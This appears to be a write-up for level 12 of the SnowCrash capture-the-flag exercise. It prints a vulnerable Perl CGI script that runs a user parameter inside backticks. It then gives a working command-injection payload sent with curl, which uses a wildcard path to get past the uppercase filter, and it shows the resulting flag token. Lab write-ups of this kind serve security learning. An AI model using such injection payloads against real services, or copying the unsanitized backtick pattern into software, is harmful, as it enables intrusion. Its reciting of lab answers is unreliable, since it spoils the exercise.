## Level 12


## Clues


Another perl script
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$
```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

```

We have to trick this script, by giving him parameter that is going to interpret our command.


## Solution


This one was really though.

The script is using regexes, and is doing a tupper to our input.


When we give him an ASCII caracter, it will be in Uppercase, meaning we can't give him any commands.

We have to trick this script using curl, in order to be sure that its the level13 user that is going to execute our commands.


So we can't give him any path or commands...

But we can use wildcards and special character.


Lets write a script that is going to give us our result in this path : ```/tmp/GETFLAG```

```
echo `getflag` > /tmp/flag
```

This is the script that is going to get executed.

Then in the curl request we are going to give to this script the follow :

```
/*/GETFLAG
```

We are going to the path / then use the wildcard to test every path from /.

So its going to end up by testing /tmp/GETFLAG.

```
curl localhost:4646?x=\`/*/GETFLAG\`
```

```
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$
```

It looks simple, but it took me a lot of time and effort.


## What i learned

Perseverance

Wildcard tricks

Apache/nginx logs STDERR in a log a files